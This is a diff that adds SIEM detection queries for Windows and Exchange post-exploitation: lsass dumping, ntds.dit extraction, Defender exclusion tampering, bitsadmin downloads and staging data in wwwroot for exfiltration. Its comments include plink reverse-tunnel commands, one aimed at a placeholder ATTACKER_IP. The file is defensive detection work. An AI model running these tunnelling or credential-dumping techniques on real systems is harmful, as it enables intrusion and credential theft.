@@ -1,0 +1,43 @@
+#bitsadmin DL from symantec report
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and destinationprocessname="bitsadmin.exe" and resourcecustomfield1 contains "getfile" and resourcecustomfield1 contains "rawreturn"
+
+#dumping of Exchange messages using powershell: Get-MessageTrackingLog/MailboxExportRequest
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and (resourcecustomfield1 contains "Get-MessageTrackingLog" or resourcecustomfield1 contains "MailboxExportRequest")
+rg_functionality = "Microsoft Windows Powershell" and baseeventid=4104 and (message contains "Get-MessageTrackingLog" or message contains "MailboxExportRequest") 
+rg_functionality = "Microsoft Windows Powershell" and baseeventid=4104 and message contains "ComObject" and message contains "Schedule.Service"
+
+#scheduled tasks creation 
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and destinationprocessname="schtasks.exe" and resourcecustomfield1 contains "powershell"
+
+#ntds.dit using a lolbins ntdsutil.exe/diskshadow.exe
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and (destinationprocessname="ntdsutil.exe" or destinationprocessname="diskshadow.exe")
+
+#Disable Scan Archive Files by Windows Defender
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield1 contains "Set-MpPreference" and resourcecustomfield1 contains "DisableArchiveScanning"
+
+#Modification Microsoft Defender exclusions (Extension/Path/Process)
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield1 contains "Add-MpPreference" and resourcecustomfield1 contains "-ExclusionExtension"
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield1 contains "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions"
+
+
+#the use of plink to establish tunnels from compromised exchange server to internal 3389
+#plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
+#plink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield1 contains "-pw" and resourcecustomfield1 contains "-pw" and resourcecustomfield1 contains "3389" 
+rg_functionality = "Endpoint Management Systems" and baseeventid=3 and destinationprocessname="svchost.exe" and sourceport="3389" and (ipaddress start with "127." OR ipaddress="::1")
+
+
+#running exe from perflogs
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield8 starts with "C:\Perflogs"
+
+#lsass dump with comsvcs.dll and MiniDump
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and destinationprocessname="rundll32.exe" and resourcecustomfield1 contains "comsvcs.dll" and resourcecustomfield1 contains "MiniDump"
+
+#lsass dump with procdump
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and resourcecustomfield1 contains " -ma "
+
+#recon and save results in wwwfolder to exfiltrate
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and destinationprocessname="dsquery.exe" and resourcecustomfield1 contains "wwwroot"
+
+#compress files in wwwfolder.  prepare for exfil
+rg_functionality = "Endpoint Management Systems" and baseeventid=1 and destinationprocessname="makecab.exe" and resourcecustomfield1 contains "wwwroot"
